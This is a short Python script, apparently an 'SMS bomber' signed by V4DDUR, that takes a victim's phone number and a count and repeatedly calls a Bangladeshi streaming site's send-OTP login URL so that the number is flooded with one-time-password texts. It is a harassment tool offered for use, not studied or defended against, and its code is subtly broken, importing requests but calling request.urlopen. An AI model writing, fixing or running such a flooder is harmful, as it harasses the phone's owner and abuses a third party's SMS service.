import os
import time
import requests
os.system('clear')

cyan="\033[0;36m"  
print (cyan+"""  
 __     ___  _   ____  ____  _   _ ____  
 \ \   / / || | |  _ \|  _ \| | | |  _ \ 
  \ \ / /| || |_| | | | | | | | | | |_) |
   \ V / |__   _| |_| | |_| | |_| |  _ < 
    \_/     |_| |____/|____/ \___/|_| \_\
                                         
                                                          

                                                                                              



------------------------------------------------
 Author   :           V4DDUR
 Facebook :           V4DDUR
 GitHub  :             mad420-max
 Version :              1.0
------------------------------------------------
""")

phone  = input("phone number: ")
sms = int(input("amount: "))

url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"

for a in range(sms):
	request.urlopen(url)
	print(str(a+1)+ "sms send ")
	time.sleep(30)
